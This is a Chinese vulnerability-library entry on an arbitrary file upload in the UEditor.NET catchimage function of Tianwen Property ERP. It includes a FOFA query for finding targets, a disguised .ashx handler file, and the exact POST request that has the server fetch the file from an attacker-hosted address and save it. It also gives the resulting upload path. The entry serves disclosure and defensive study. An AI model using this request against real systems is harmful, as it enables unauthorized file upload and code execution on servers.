---
source: "wy876 漏洞文库"
title: "天问物业ERP UEditor.NET catchimage远程资源后缀绕过上传"
product: "天问物业ERP UEditor.NET"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "UEditor.NET具体版本未列"
prerequisites: "带session，前台条件待核；服务能取外部资源"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/ytzd6rysuc9t66vs"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E5%A4%A9%E9%97%AE%E7%89%A9%E4%B8%9AERP/%E5%A4%A9%E9%97%AE%E7%89%A9%E4%B8%9AERP%E7%B3%BB%E7%BB%9FUEditor%E7%BC%96%E8%BE%91%E5%99%A8%E5%AD%98%E5%9C%A8%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
fofa: "body=\"国家版权局软著登字第1205328号\""
fofa_unverified: "body="
id: "vw-ab14f2d4f0978391dfbb484c"
entity_id: "ve-ab14f2d4f0978391dfbb484c"
schema_version: "1"
---

# 天问物业ERP UEditor.NET catchimage远程资源后缀绕过上传

## 条目说明

- 对象与具体问题：天问物业ERP UEditor.NET；catchimage远程资源后缀绕过上传
- 版本、配置及部署条件：UEditor.NET具体版本未列
- 认证与权限前提：带session，前台条件待核；服务能取外部资源
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 纯hello处理器不是webshell，应准确称验证代码
- vpn疑为vps笔误，步骤缺3；来源未提供编辑器修复矩阵
- URL查询串?.ashx与保存扩展根因需补，不能笼统说所有.NET版受影响
- FOFA截断，日期输出路径可变

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
天问物业ERP系统使用了UEditor编辑器，Ueditor是百度开发的一个网站编辑器，目前已经不对其进行后续开发和更新，该漏洞只存在于该编辑器的.net版本。其他的php,jsp,asp版本不受此UEditor的漏洞的影响，.net存在任意文件上传，绕过文件格式的限制，在获取远程资源的时候并没有对远程文件的格式进行严格的过滤与判断。

## 二、影响版本
+ 天问物业ERP系统

## 三、资产测绘
+ fofa`body="国家版权局软著登字第1205328号"`
+ 登录页面


## 四、漏洞复现
1. 新建文件，内容为webshell，文件命令为`1.png`

```plain
<% @ webhandler language="C#" class="AverageHandler" %> 

using System; 
using System.Web; 

public class AverageHandler : IHttpHandler 
{ 
public bool IsReusable 
{ get { return true; } } 
public void ProcessRequest(HttpContext ctx) 
{ 
ctx.Response.Write("hello"); 
} 
}
```


2. 将`1.png`传到vpn上，使用python起个http服务

```plain
python3 -m http.server 50000
```


4. 替换`source[]`为webshell文件地址，通过exp上传文件

```http
POST /HM/M_main/Jscript-Ui/UEditor/net/controller.ashx?action=catchimage HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Origin: null
Connection: close
Cookie: ASP.NET_SessionId=mzare1hg1ewzaxhakacjhfo0
Upgrade-Insecure-Requests: 1

source[]=http://xx.xx.xx.xx:50000/1.png?.ashx
```

> 请求长度说明：原资料 Content-Length 为 47；静态长度已移除，应由客户端根据最终请求体的字节数生成。


5. 上传文件位置

```plain
/HM/M_main/Jscript-Ui/UEditor/net/upload/image/20231109/6383508541150163493063174.ashx
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ytzd6rysuc9t66vs>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
